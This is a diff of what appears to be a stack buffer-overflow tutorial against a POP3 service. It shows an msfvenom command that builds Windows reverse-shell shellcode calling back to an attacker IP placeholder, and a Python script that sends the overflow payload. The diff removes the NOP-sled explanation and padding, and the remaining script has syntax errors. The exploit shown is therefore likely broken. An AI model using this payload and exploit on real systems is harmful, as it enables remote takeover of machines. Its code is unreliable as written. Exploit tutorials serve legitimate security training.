@@ -251,19 +251,7 @@ We will create our shellcode using msfvenom by avoiding the bad chars (\x00\x0a\
 msfvenom -p windows/shell_reverse_tcp LHOST=<MY_ATTACKER_IP> LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
-This will create us encoded, bad chars free shellcode in 351 bytes long.
-
-Now we need to pad our shellcode with NOP (no-operation) instructions which basiclly "slide" the execution flow to the next memory address, in our case, until it hits the start of the shellcode.
-
-We need to calculate NOP sleds as following:
-
- [offset_total A's (0x41)] - [eip] - [shellcode]
-
-In our case:
-
-2606 - 4 - 351 = 2251 bytes left for our payload data and our nopsled.
-
-So we will use 16 times NOP sleds (\x90) and substract it from our final padding:
+This will create us encoded, bad chars free shellcode in 351 bytes long. Finally, our final exploit will look like:
 
 ```
 import socket
@@ -273,9 +261,8 @@ shellcode = ("GENERATED SHELLCODE")
 
 payload = "A" * 2606
 payload += ""\x8f\x35\x4a\x5f"
-payload += "\x90" * 16
 payload + = shellcode
-payload += "C" * (3500 - 2606 - 4 - 16 - 351)
+payload += "C" * (3500 - 2606 - 4 - 351)
 
 print "\nSending evil buffer..."
 s.connect(('127.0.0.1',110))
